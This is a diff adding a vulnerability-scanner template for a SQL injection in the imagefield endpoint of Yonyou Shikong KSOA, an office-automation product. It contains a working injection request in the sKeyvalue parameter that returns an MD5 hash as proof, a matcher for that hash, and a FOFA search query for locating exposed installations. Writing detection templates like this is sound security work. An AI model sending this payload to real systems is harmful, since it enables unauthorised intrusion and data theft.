@@ -1,0 +1,25 @@
+id: yonyou-ksoa-imagefield-sqli
+info:
+  name: 用友时空 KSOA imagefield - sqli
+  author: leadlife
+  severity: high
+  description: 用友时空KSOA imagefield接口存在SQL注入漏洞，黑客可以利用该漏洞执行任意SQL语句，如查询数据、下载数据、写入webshell、执行系统命令以及绕过登录限制等。
+  reference: 
+    - https://wiki.wy876.cn/#/%E7%94%A8%E5%8F%8B%E6%97%B6%E7%A9%BAKSOA-imagefield%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E
+  metadata:
+    verified: true
+    fofa-query: app="用友-时空KSOA"
+  tags: yonyou,sqli,ksoa,oa
+
+http:
+  - raw:
+      - |
+        GET /servlet/imagefield?key=readimage&sImgname=password&sTablename=bbs_admin&sKeyname=id&sKeyvalue=-1%27+union+select+sys.fn_varbintohexstr(hashbytes(%27md5%27,%271%27))--+ HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains(body,'c4ca4238a0b923820dcc509a6f75849b')
+        condition: and
